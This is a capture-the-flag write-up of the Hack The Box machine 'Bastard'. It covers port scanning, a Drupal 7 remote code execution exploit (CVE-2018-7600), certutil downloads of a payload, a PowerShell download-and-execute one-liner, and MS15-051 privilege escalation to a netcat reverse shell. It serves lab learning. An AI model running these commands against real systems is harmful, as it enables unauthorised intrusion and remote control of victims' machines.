### HTB Bastard   10.10.10.9

Welcome back.  This run is going to be on the HTB machine called "Bastard".

Once again, my favorite nmap stuff.

```
(kali@kali)-$ sudo nmap -T4 -p- -Pn 10.10.10.9                          
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 04:36 EST
Nmap scan report for 10.10.10.9
Host is up (0.043s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 93.27 seconds
                                                                                                                                 
(kali@kali)-$ sudo nmap -A -p 80,135,49154 10.10.10.9                                                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 04:39 EST
Nmap scan report for 10.10.10.9
Host is up (0.045s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-title: Welcome to Bastard | Bastard
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   49.64 ms 10.10.14.1
2   49.65 ms 10.10.10.9

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.84 seconds
```

Looks like we have a couple ports.  First and foremost, we're going to take a look at the port 80, a webpage.  Let's see what we have there.

![webpage](/Images/HTB7Bastard/pic1.png)

So we have a pretty normal looking webpage.  First I tried to see what I could do with the website, even ran dirbuster for a bit to see if anything showed up.  Nothing really with dirbuster and trying to create an account requires a valid email to verify the account.  Not doing that, so what now.

Let's take a look at our wappalyzer.

![wappalyzer](/Images/HTB7Bastard/pic2.png)

Oh, would you look at that, an older version of Drupal.  We also have PHP running so that might come in handy later.  Lets see what we can do with drupal first though.

Some online looking and I find CVE-2018-7600 which is an RCE vulerability within Drupal 7.  Copy and paste it into a file to use, make sure you have the requirements needed, and off we go.  We can now run whatever command we want.

```
(kali@kali)-$ python3 44449.py http://10.10.10.9 -c "whoami"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-9zW4TvyxBXU8a9XaVwtidpw4j9OKjAqcmJdfxrD97j4
[*] Triggering exploit to execute: whoami
nt authority\iusr

```

With this we can use msfvenom to craft an exploit and then use this drupal exploit to upload and run it.  Also, notice it's `iusr` and not `system` so we don't have full control yet.

```
(kali@kali)-$ python3 44449.py http://10.10.10.9 -c "certutil.exe -urlcache -f http://10.10.x.x/shell.exe shell.exe"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-jKuI8GmkHGhmEcEQ0PivluXBvtSyRcM-hUbIs4qNCRg
[*] Triggering exploit to execute: certutil.exe -urlcache -f http://10.10.x.x/shell.exe shell.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

                                                                                                                                 
┌──(kali@kali)-[~/Documents/HTB Bastard]
└─$ python3 44449.py http://10.10.10.9 -c "shell.exe"                                                       

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-DZtqdeKNbpUodK05ubSyeg3_a6-PO-aHhJPUbgg1H5s
[*] Triggering exploit to execute: shell.exe
```

![whoami](/Images/HTB7Bastard/pic3.png)

Again, this doesn't let us into the Admin stuff but we can grab the user flag at this point.

![whoami](/Images/HTB7Bastard/pic4.png)

Now that we've gotten here, let's escalate this bish!

Going to use `Sherlock.ps1` to see what we've got here.  In order to do that we'll need to modify it a bit, upload it, and then run it.

First, the modification.

So locate the Sherlock file and go to it.  I had mine in some pre-installed tools, `powershell-empire` in the /usr/bin folder.  Using gedit to open Sherlock.ps1, and add the following to the bottom of the file.

`Find-AllVulns`

That goes in all the way at the bottom of the file and will now allow us to use this script to run instead of just loading it and waiting for a command.

Once that's done, we start up and http server with python from that folder, then we use the following command from book.hacktricks.xyz.

`echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.x.x:80/Sherlock.ps1') | powershell -noprofile -`

This is a "download and execute" command.  Running that gives us some items to look at.

![Sherlock results](/Images/HTB7Bastard/pic5.png)

Look this up online and we see right off hand that this module requires metasploit.  Good thing it already comes installed on Kali.  But, we're gonna go the manual route.  So a google search for MS15-051 returns a github repository for windows kernel exploits.

With this one, we have to do a few things.  MS15-051 allows us to execute a command as NT AUTHORITY/SYSTEM.  So, we're going to upload it along with netcat in order to pop a shell from that device.

We moved the ms15-051x64.exe file and nc.exe over to a folder where we use python to host a web server.  Then use `certutil` to download those files to the victim machine.

Once we do that, we start up a listener on our device and then use the exploit file along with netcat in order to get our shell going.

```
C:\inetpub\drupal-7.54>ms15-051x64.exe "nc.exe 10.10.x.x 7777 -e cmd.exe"
ms15-051x64.exe "nc.exe 10.10.14.31 7777 -e cmd.exe"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2724 created.
```

![Full Pwnage](/Images/HTB7Bastard/pic6.png)

So, here we are with another box completed.  This one was a little tougher.  Had to use the reference video a couple of times.  There are some items that seem would not work (again, I tried to look at some items earlier with the website itself before going down this route and there are a couple options for ms15-051 before getting one that did work).  Always always try different items.  Where one might not work, others could very well work.

Thanks for tagging along :D ^.^